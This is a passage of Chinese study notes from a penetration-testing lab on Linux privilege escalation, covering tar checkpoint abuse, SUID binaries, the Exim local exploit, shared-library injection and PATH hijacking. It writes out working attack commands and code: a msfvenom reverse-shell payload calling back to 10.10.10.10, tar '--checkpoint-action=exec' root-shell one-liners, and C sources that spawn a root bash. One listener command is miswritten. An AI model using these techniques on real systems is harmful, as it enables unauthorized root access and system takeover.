<tr>
<th><code>tar czf /tmp/backup.tar.gz *</code></th>
<th><strong>将当前目录下的所有文件和文件夹打包并压缩为</strong><code>/tmp/backup.tar.gz</code></th>
</tr>
</thead>
</table>
<ul>
<li><code>tar</code>：Linux 下的归档工具</li>
<li><code>c</code>：创建新的归档文件</li>
<li><code>z</code>：使用 gzip 压缩</li>
<li><code>f</code>：指定归档文件名</li>
<li><code>*</code>：匹配当前目录下的所有文件和文件夹</li>
<li><strong>这里的</strong><code>/home/user</code>就是初始用户的家目录</li>
</ul>
<p><strong>这是贴合实际的，管理员会经常对重要目录下的文件进行备份</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126215609278.png?lastModify=1766751620" alt="image-20251126215609278"></p>
<p><strong>我们可以根据****tar</strong>的这个点提权</p>
<p><strong>kali</strong></p>
<p><strong>先构造一个二进制文件的反弹shell</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5052" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> msfvenom-p linux/x64/shell_reverse_tcp <span class="cm-def">LHOST</span><span class="cm-operator">=</span><span class="cm-number">10</span>.10.10.10 <span class="cm-def">LPORT</span><span class="cm-operator">=</span><span class="cm-number">4444</span> <span class="cm-attribute">-f</span> elf <span class="cm-attribute">-o</span> shell.elf</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126215801559.png?lastModify=1766751620" alt="image-20251126215801559"></p>
<p><strong>然后架设web服务器</strong>	<code>sudo php -S 0:80</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126215955595.png?lastModify=1766751620" alt="image-20251126215955595"></p>
<p><strong>靶机中，</strong><code>wget</code>把<code>shell.elf</code>下载下来</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126220133047.png?lastModify=1766751620" alt="image-20251126220133047"></p>
<p>**给他权限 **<code>chmod +xs shell.elf</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126220221181.png?lastModify=1766751620" alt="image-20251126220221181"></p>
<p>**kali中开启监听 **	<code>sudo -lvnp 4444</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126220505326.png?lastModify=1766751620" alt="image-20251126220505326"></p>
<p><strong>因为需要用到tar的检查点进行提权，要建几个文件（user目录下）</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126220527354.png?lastModify=1766751620" alt="image-20251126220527354"></p>
<table>
<thead>
<tr>
<th><code>--checkpoint=1</code></th>
<th><strong>每处理 1 个文件就触发一次检查点</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>--checkpoint-action=exec=xxx</code></td>
<td><strong>到达检查点时执行操作</strong></td>
</tr>
</tbody></table>
<p><strong>等待自动任务执行即可</strong></p>
<p><strong>在自行自动任务时，会打包当前路径下的文件，在检测点时会执行我们的</strong><code>shell.elf</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126221042217.png?lastModify=1766751620" alt="image-20251126221042217"></p>
<blockquote>
<h3 id="tar-的-Checkpoint-机制"><a href="#tar-的-Checkpoint-机制" class="headerlink" title="tar 的 Checkpoint 机制"></a>tar 的 Checkpoint 机制</h3><ul>
<li><strong>–checkpoint</strong>         每 N 个文件打印一次进度</li>
<li><strong>–checkpoint-action&#x3D;ACTION</strong>  到达检查点时执行 ACTION** **ACTION 可以是：</li>
<li><code>exec=command</code>           <strong>直接 fork+exec 命令</strong>（root 身份）</li>
<li><code>echo=string</code>            打印字符串（无代码执行）</li>
</ul>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="①-sudo-白名单"><a href="#①-sudo-白名单" class="headerlink" title="① sudo 白名单"></a>① sudo 白名单</h4><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5087" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">user <span class="cm-def">ALL</span><span class="cm-operator">=</span>(root) NOPASSWD: /bin/tar</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**→ 普通用户可 **<strong>以 root 身份跑 tar</strong>。</p>
<h4 id="②-cron-root-定时备份脚本"><a href="#②-cron-root-定时备份脚本" class="headerlink" title="② cron&#x2F;root 定时备份脚本"></a>② cron&#x2F;root 定时备份脚本</h4><p><strong>1.如本次提权</strong></p>
<p><strong>2.如下</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5092" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#!/bin/sh</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">cd</span> /home && tar czf /tmp/backup.tar.gz <span class="cm-attribute">--checkpoint</span><span class="cm-operator">=</span><span class="cm-number">1</span> <span class="cm-attribute">--checkpoint-action</span><span class="cm-operator">=</span><span class="cm-def">exec</span><span class="cm-operator">=</span>/bin/bash user</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p>**→ 攻击者 **<strong>写入家目录文件</strong>即可触发。</p>
</blockquote>
<h3 id="tar的sudo白名单提权上下"><a href="#tar的sudo白名单提权上下" class="headerlink" title="tar的sudo白名单提权上下"></a>tar的sudo白名单提权上下</h3><p><strong>sudo 白名单</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5096" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">user <span class="cm-def">ALL</span><span class="cm-operator">=</span>(root) NOPASSWD: /bin/tar</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**→ 普通用户可 **<strong>以 root 身份跑 tar</strong>。</p>
<blockquote>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5099" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> tar czf /tmp/bak.tar.gz \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">          <span class="cm-attribute">--checkpoint</span><span class="cm-operator">=</span><span class="cm-number">1</span> \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">          <span class="cm-attribute">--checkpoint-action</span><span class="cm-operator">=</span><span class="cm-def">exec</span><span class="cm-operator">=</span>/bin/bash \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">          /tmp/evil</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong>t0 sudo 启动 tar，euid&#x3D;0</strong> <strong>t1 tar 扫描 &#x2F;tmp&#x2F;evil，发现 1 个文件</strong> <strong>t2 触发 checkpoint → fork()</strong> <strong>t3 子进程 execve(“&#x2F;bin&#x2F;bash”, …)   ← 此时 uid&#x2F;gid&#x3D;0</strong> <strong>t4 你拿到 # 提示符，id 显示 uid&#x3D;0(root)</strong> <strong>t5 退出 bash 后 tar 继续打包，正常结束</strong></p>
<p><strong>上面的反斜线\是用来分割命令的，具体直接写下面的就行</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5102" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> tar czf /dev/null <span class="cm-attribute">--checkpoint</span><span class="cm-operator">=</span><span class="cm-number">1</span> <span class="cm-attribute">--checkpoint-action</span><span class="cm-operator">=</span><span class="cm-def">exec</span><span class="cm-operator">=</span>/bin/bash /etc/hostname</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<blockquote>
<p><code>/etc/hostname</code> 只有 1 行，也足够触发 checkpoint&#x3D;1。</p>
</blockquote>
</blockquote>
<h2 id="SUID提权-5讲"><a href="#SUID提权-5讲" class="headerlink" title="SUID提权 5讲"></a>SUID提权 5讲</h2><p><strong>对于****可执行文件位</strong>的搜索</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找 SUID 文件。查看有S位的可执行文件</p>
<table>
<thead>
<tr>
<th><strong>片段</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>find</code></td>
<td><strong>查找文件</strong></td>
</tr>
<tr>
<td><code>/</code></td>
<td><strong>从根目录开始递归搜整个文件系统</strong></td>
</tr>
<tr>
<td><code>-perm -u=s</code></td>
<td><strong>匹配****用户位</strong>设置了<strong>SUID</strong>的文件（<code>-</code>表示“至少”该位）</td>
</tr>
<tr>
<td><code>-type f</code></td>
<td><strong>只列出普通文件，排除目录、链接等</strong></td>
</tr>
<tr>
<td><code>2&gt;/dev/null</code></td>
<td><strong>把“权限拒绝”等错误信息扔进黑洞，屏幕只保留结果</strong></td>
</tr>
<tr>
<td><code>-perm -u=s</code></td>
<td><strong>用户位****含 SUID</strong></td>
</tr>
<tr>
<td><code>-perm -g=s</code></td>
<td><strong>组位****含 SGID</strong></td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127183643279.png?lastModify=1766751620" alt="image-20251127183643279"></p>
<p><strong>执行这些文件，将以****文件属主的权限执行</strong>，获得提权的路径。<strong>比如下面有SUID的可执行程序属主就是root</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127194224404.png?lastModify=1766751620" alt="image-20251127194224404"></p>
<p><strong>判断如何利用：</strong></p>
<p><strong>1.直接执行，查看交互结果</strong></p>
<p><strong>2.strings查看可读字符串</strong></p>
<p><strong>3.strace看他和系统内核之间有哪些交互</strong></p>
<h3 id="1-SUID可执行文件已知利用提权"><a href="#1-SUID可执行文件已知利用提权" class="headerlink" title="1.SUID可执行文件已知利用提权"></a>1.SUID可执行文件已知利用提权</h3><p><strong>很多工具具有s位，如何利用，去找已知的公开利用文件</strong></p>
<p><strong>下面只做其中的一个演示</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127185433709.png?lastModify=1766751620" alt="image-20251127185433709"></p>
<p><strong><code>exim-4.84-3</code>的利用</strong></p>
<p><strong>Exim 提权的核心：****“邮件服务器常以 root 身份运行，默认&#x2F;配置失误后，普通用户可投递恶意邮件或在命令行里插入任意选项 → 触发高危功能 → 拿到 root shell”</strong>。</p>
<p><strong>漏洞版本</strong>：≤ 4.94 均可。</p>
<p><strong>Exim 常以 root 跑，配置或代码里 <code>${run{}}</code>、<code>-be</code>、<code>-bnex</code> 等选项没降权，就能把命令插进去执行；本地一条 <code>exim -be &#39;${run{/bin/bash}}&#39;</code> 就能提权，远程则往邮件头里扔 <code>${run{}}</code> 一样秒 root，升级版本或禁用字符串扩展即可防。</strong></p>
<p><code>searchsploit exim</code>	<strong>找到这个对应的4.84-3的</strong><code>Privilege Escalation即：本地提权</code>的<code>39535.sh</code>文件下载下来</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127183809401.png?lastModify=1766751620" alt="image-20251127183809401"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127184122015.png?lastModify=1766751620" alt="image-20251127184122015"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127184208460.png?lastModify=1766751620" alt="image-20251127184208460"></p>
<p>**kali开启服务器 **<code>sudo php -S 0:80</code>	**靶机下载 : **<code>wget</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127184623445.png?lastModify=1766751620" alt="image-20251127184623445"></p>
<p><code>chmod +x 39535.sh</code>给他执行权限**	**</p>
<p><code>./39535.sh</code>执行，即可获得root权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127184802563.png?lastModify=1766751620" alt="image-20251127184802563"></p>
<h3 id="2-SUID共享库注入提权"><a href="#2-SUID共享库注入提权" class="headerlink" title="2.SUID共享库注入提权"></a>2.SUID共享库注入提权</h3><p><strong>在打靶过程中，只要有s位的可执行文件，没见过：可以执行一下试试；也可以直接搜利用</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127185512284.png?lastModify=1766751620" alt="image-20251127185512284"></p>
<p><strong>Linux中的so指代什么内容？</strong></p>
<h3 id="Shared-Object（共享库）-★★★-最常见-99"><a href="#Shared-Object（共享库）-★★★-最常见-99" class="headerlink" title="Shared Object（共享库） ★★★ 最常见**	**99%"></a><strong>Shared Object（共享库）</strong> ★★★ 最常见**	**99%</h3><ul>
<li><strong>文件后缀</strong>：<code>.so</code>（如 <code>libc.so.6</code>）</li>
<li><strong>本质</strong>：ELF 格式的 <strong>动态链接库</strong>，代码只加载一次，<strong>多进程共享</strong>，节省内存&#x2F;磁盘。</li>
<li></li>
</ul>
<p><strong>这里我们先执行了一下看看是干什么的程序。。。看不出来</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127185549785.png?lastModify=1766751620" alt="image-20251127185549785"></p>
<p><strong>用 <strong><code>strings</code>读取执行过程中的</strong>可读字符串</strong>，里面也涉及   <code>.so</code>格式</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127185857457.png?lastModify=1766751620" alt="image-20251127185857457"></p>
<p><strong>用</strong><code>strace</code>追踪该文件</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127190610224.png?lastModify=1766751620" alt="image-20251127190610224"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127190627275.png?lastModify=1766751620" alt="image-20251127190627275"></p>
<p>**他是一个进度条走了好多遍，用 **<code>|grep &#39;/home&#39;</code>做一些聚焦，到strings的Done上面的最后一行</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127190818139.png?lastModify=1766751620" alt="image-20251127190818139"></p>
<p><strong>这里说要打开home下的这个文件，但是没找到这个文件和目录：即****想操作我们初始用户的家目录，那我们就可以做利用了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127191043289.png?lastModify=1766751620" alt="image-20251127191043289"></p>
<p>**没有这个 **<code>.config</code> 目录就建一个，在目录里建 <code>libcalc.so</code></p>
<p><strong>由于是.so文件，我们要先建源文件然后编译</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127191243156.png?lastModify=1766751620" alt="image-20251127191243156"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="c" cid="n5198" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="c"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <stdio.h></span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <stdlib.h></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-keyword">static</span> <span class="cm-variable-3">void</span> <span class="cm-def">inject</span>() <span class="cm-variable">__attribute__</span>((<span class="cm-variable">constructor</span>));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-keyword">static</span> <span class="cm-variable-3">void</span> <span class="cm-def">inject</span>() {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">setgid</span>(<span class="cm-number">0</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">setuid</span>(<span class="cm-number">0</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">system</span>(<span class="cm-string">"/bin/bash -p"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">}</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127191458496.png?lastModify=1766751620" alt="image-20251127191458496"></p>
<p>**这段 C 代码是一个 <strong><strong>“共享库劫持型 rootkit”</strong> 的核心——<strong>不依赖 <code>_init</code>，用 GCC 扩展属性 <code>constructor</code> 实现更通用的构造函数</strong>。</strong> **功能：<strong>一旦 .so 被任何程序加载，就立即把进程变成 root shell</strong>。</p>
<table>
<thead>
<tr>
<th><strong>行</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>#include &lt;stdio.h&gt;</code>&#x2F;<code>#include &lt;stdlib.h&gt;</code></td>
<td><strong>引入</strong><code>setuid/setgid/system</code>原型（可省，但严谨）</td>
</tr>
<tr>
<td><code>static void inject() __attribute__((constructor));</code></td>
<td><strong>GCC 扩展属性</strong>：<strong>把函数标记为“构造函数”</strong>→<strong>在<code>main()</code>之前被自动执行</strong>（比<code>_init</code>更通用，兼容静态&#x2F;动态链接）</td>
</tr>
<tr>
<td><code>static void inject() { ... }</code></td>
<td><strong>构造函数实体</strong></td>
</tr>
<tr>
<td><code>setgid(0); setuid(0);</code></td>
<td><strong>硬改有效用户&#x2F;组为 root</strong>（需当前 euid&#x3D;0 或 CAP_**SETUID，**<strong>sudo 场景必成功</strong>）</td>
</tr>
<tr>
<td><code>system(&quot;/bin/bash -p&quot;);</code></td>
<td><strong>弹出交互 bash</strong>，<code>-p</code>防止 bash 因缺权限自动降权</td>
</tr>
</tbody></table>
<p><strong>与旧 <code>_init</code> 写法对比</strong></p>
<table>
<thead>
<tr>
<th><strong>写法</strong></th>
<th><strong>触发时机</strong></th>
<th><strong>兼容性</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>void _init(void)</code></td>
<td><strong>仅动态 .so 被<code>dlopen/ld.so</code>装载时</strong></td>
<td><strong>老派，需</strong><code>-nostartfiles</code></td>
</tr>
<tr>
<td><code>__attribute__((constructor))</code></td>
<td><strong>动态&#x2F;静态链接都执行</strong></td>
<td><strong>现代、简洁、无需特殊链接选项</strong></td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127192853029.png?lastModify=1766751620" alt="image-20251127192853029"></p>
<p><strong>此时再执行</strong><code>suid-so</code>就会加载我们写好的文件了**	**</p>
<p><strong>如果不是</strong><strong>“没有”</strong>，我们能不能<strong>修改&#x2F;删除后创建新</strong>的呢？<strong>权限</strong></p>
<h3 id="3-SUID环境变量利用提权"><a href="#3-SUID环境变量利用提权" class="headerlink" title="3.SUID环境变量利用提权"></a>3.SUID环境变量利用提权</h3><p><strong>现在只是告诉你****试到这一步时</strong>如何进行提权，而不是问<strong>你怎么知道这个能提权的？</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127193240486.png?lastModify=1766751620" alt="image-20251127193240486"></p>
<p><strong>先执行一下看看，他说已经开启apache服务器</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127193619532.png?lastModify=1766751620" alt="image-20251127193619532"></p>
<p><strong>string</strong>是查看可读字符串</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127193711477.png?lastModify=1766751620" alt="image-20251127193711477"></p>
<p><strong>这里set设置了sgid和suid，最后一行说，用****service这个服务</strong>，开启apache2</p>
<p><strong>注意，这里用的****service</strong>是<strong>相对路径</strong>而不是<strong>绝对路径</strong>，那我们就可以自己构造service</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="c" cid="n5254" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="c"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <stdio.h></span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <stdlib.h></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-variable-3">void</span> <span class="cm-def">main</span>() {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">setgid</span>(<span class="cm-number">0</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">setuid</span>(<span class="cm-number">0</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">system</span>(<span class="cm-string">"/bin/bash -p"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">}</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127194509372.png?lastModify=1766751620" alt="image-20251127194509372"></p>
<p><strong>将.c文件编译位</strong><code>service</code>文件</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127194526330.png?lastModify=1766751620" alt="image-20251127194526330"></p>
<p><strong>对环境变量路径进行指定，实现service的劫持</strong></p>
<p><strong>因为我们创建的</strong><code>service</code>是在我们的家目录，而系统的环境变量中，我们的路径并不优先</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127194708411.png?lastModify=1766751620" alt="image-20251127194708411"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127194835917.png?lastModify=1766751620" alt="image-20251127194835917"></p>
<p><strong>把当前含义service二进制文件的目录，赋给PATH的头部，就会优先执行我们给的这个</strong><code>service</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127195741633.png?lastModify=1766751620" alt="image-20251127195741633"></p>
<p><strong><code>export PATH=.:$PATH</code>的含义：</strong></p>
<ul>
<li><strong>把当前目录 “.” 插到 PATH 最前面</strong></li>
<li><strong>效果</strong>：<strong>shell 找命令时先扫当前目录，再去系统路径</strong></li>
<li><strong>提权意义</strong>：后面如果某程序 <strong>只写文件名</strong>（不写绝对路径），我们就能 <strong>在当前目录放一个同名恶意脚本&#x2F;二进制</strong>，<strong>让 root 先执行我们的文件</strong> → <strong>劫持 flow</strong></li>
</ul>
<p><strong>普通用户完全能执行</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5275" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-keyword">export</span> <span class="cm-def">PATH</span><span class="cm-operator">=</span>.:<span class="cm-def">$PATH</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><strong>PATH 是当前 shell 的环境变量</strong>，不属于系统特权配置。</li>
<li><strong>这条命令****只影响你自己的会话</strong>（以及从这个会话 fork 出去的子进程），<strong>不会改别的用户或系统路径</strong>。</li>
<li>**退出终端或开新 shell 就失效（除非写进 **<code>\\x7e/.bashrc</code> 使其持久化）。</li>
</ul>
<p><strong>执行 <strong><code>/usr/local/bin/suid-env</code> 他会执行 <strong><code>service apache2 start</code></strong> 而service由于是</strong>相对路径</strong>，且环境变量$PATH是先扫本目录的文件</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127195959825.png?lastModify=1766751620" alt="image-20251127195959825"></p>
<p><strong>所以就会先执行我们构造的恶意</strong><code>service</code>二进制文件，<code>/bin/bash -p</code>获得root权限</p>
